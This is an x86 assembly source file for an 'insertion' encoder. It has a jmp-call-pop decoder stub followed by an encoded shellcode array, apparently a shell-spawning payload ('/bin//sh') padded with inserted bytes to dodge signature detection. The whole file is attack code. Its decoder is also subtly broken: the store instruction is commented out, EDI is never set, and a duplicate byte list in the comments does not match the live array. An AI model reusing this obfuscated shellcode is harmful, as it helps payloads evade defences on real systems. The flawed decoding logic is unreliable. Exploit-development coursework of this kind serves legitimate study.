; Custom Encoder (Insertion)
; SLAER

global _start:

section .text

_start:

xor esi, esi
xor ebx, ebx		; Cleared EBX
mul ebx			; cleared EAX, EDX
xor ecx, ecx

jmp short caller

decoder:			; Managing pre-requisite

	pop esi			; Got hold of encoded shellcode in ESI using jmp-pop-call technique.
	;xor edi,edi			; Also ESI pointing to first character i.e. 0x31 in this case.
	;lea edi, [esi+1]	; Now edi pointing to first inserted character 
	inc al			; Incremented AL by 1


decode: 			; Actual decode routine
	mov bl, byte [esi + eax]
	sub bl, 0x01
	cmp bl, 0x01
	jz short EncodedShell
	;add al, 1
	mov bl, byte [esi + eax +1]
	;mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	


caller:

	call decoder
	EncodedShell: db 0x31,0x0e,0xf6,0xc3,0xeb,0xe7,0x1c,0x0e,0x5e,0xa4,0x31,0xc7,0xdb,0x17,0xf7,0x7f,0xe3,0x5d,0x88,0xed,0x5e,0x5c,0x07,0x34,0x89,0x20,0x76,0xb8,0x08,0x23,0x89,0x0e,0x5e,0xb6,0x0c,0x3a,0x8d,0xb9,0x1e,0xb4,0x8d,0x2f,0x4e,0xf1,0x08,0x26,0x8d,0xf7,0x56,0x79,0x0c,0xc0,0x31,0x5c,0xc0,0xf4,0xb0,0x69,0x0b,0xfd,0xcd,0xad,0x80,0x32,0xe8,0xcb,0xdf,0x60,0xff,0x24,0xff,0x53,0xff,0xb4,0x2f,0x64,0x62,0xc0,0x69,0x69,0xa3,0x6e,0x04,0x2f,0x20,0x73,0xa2,0x68,0x05,0x41,0x70,0x42,0x26,0x42,0x0c,0x42,0xdb,0x42,0x26,0x43,0xd3,0x43,0xd9,0x43,0x85,0x43,0xcd,0x02,0x02


;0x31,0x0e,0xf6,0xc3,0xeb,0xe7,0x1c,0x0e,
;0x5e,0xa4,0x31,0xc7,0xdb,0x17,0xf7,0x7f,
;0xe3,0x5d,0x88,0xed,0x5e,0x5c,0x07,0x34,
;0x89,0x20,0x76,0xb8,0x08,0x23,0x89,0x0e,
;0x5e,0xb6,0x0c,0x3a,0x8d,0xb9,0x1e,0xb4,
;0x8d,0x2f,0x4e,0xf1,0x08,0x26,0x8d,0xf7,
;0x56,0x79,0x0c,0xc0,0x31,0x5c,0xc0,0xf4,
;0xb0,0x69,0x0b,0xfd,0xcd,0xad,0x80,0x32,
;0xe8,0xcb,0xdf,0x60,0xff,0x24,0xff,0x53,
;0xff,0xb4,0x2f,0x64,0x62,0xc0,0x69,0xa3,
;0x6e,0x04,0x2f,0x20,0x73,0xa2,0x68,0x05,
;0x41,0x70,0x42,0x26,0x42,0x0c,0x42,0xdb,
;0x42,0x26,0x43,0xd3,0x43,0xd9,0x43,0x85,
;0x43,0xcd,0x02,0x02
